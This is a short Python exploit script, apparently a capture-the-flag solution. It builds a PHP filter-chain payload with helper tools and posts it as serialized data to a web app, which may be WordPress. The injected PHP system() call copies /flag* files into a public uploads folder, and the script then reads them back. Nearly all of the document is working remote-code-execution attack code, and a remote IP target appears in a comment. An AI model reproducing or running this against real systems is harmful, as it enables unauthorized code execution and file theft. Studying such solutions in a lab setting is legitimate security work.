import httpx
import asyncio
from subprocess import Popen, PIPE

URL = "http://localhost"
# URL = "http://18.140.17.89:9100"

def payload(payload):
    filter_chain = Popen(['python3', 'filter_chain.py', '--chain', payload], stdout=PIPE, stderr=PIPE)
    filter_chain = filter_chain.stdout.read().decode('utf-8').strip()
    return Popen(['php', 'solve.php', filter_chain], stdout=PIPE, stderr=PIPE).stdout.read().decode('utf-8')

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=10)

    def serialize(self, payload: str) -> None:
        # content = base64.b64encode(content.encode()).decode()
        return self.c.post("/", data={"serialized_data": payload, "generate": "Generate"})
    
class API(BaseAPI):
    ...

async def main():
    api = API()
    res = await api.serialize(payload("<?php system('cat /flag* > /var/www/html/wp-content/uploads/this_is_secret_folder_dont_touch_it');?>"))
    print(res.text)
    res = await api.c.get("/wp-content/uploads/this_is_secret_folder_dont_touch_it")
    print(res.text)


if __name__ == "__main__":
    asyncio.run(main())